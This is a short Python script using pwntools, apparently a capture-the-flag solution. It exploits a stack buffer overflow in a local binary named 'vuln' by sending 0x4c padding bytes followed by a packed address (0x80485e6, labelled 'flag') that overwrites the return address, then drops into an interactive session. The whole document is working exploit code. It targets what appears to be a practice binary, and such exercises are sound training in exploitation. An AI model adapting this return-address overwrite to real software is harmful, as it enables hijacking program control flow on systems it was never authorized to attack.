from pwn import *
s = process("./vuln")
flag = 0x80485e6 
payload = 'a'*0x4c
payload += p32(flag)
s.sendline(payload)
s.interactive()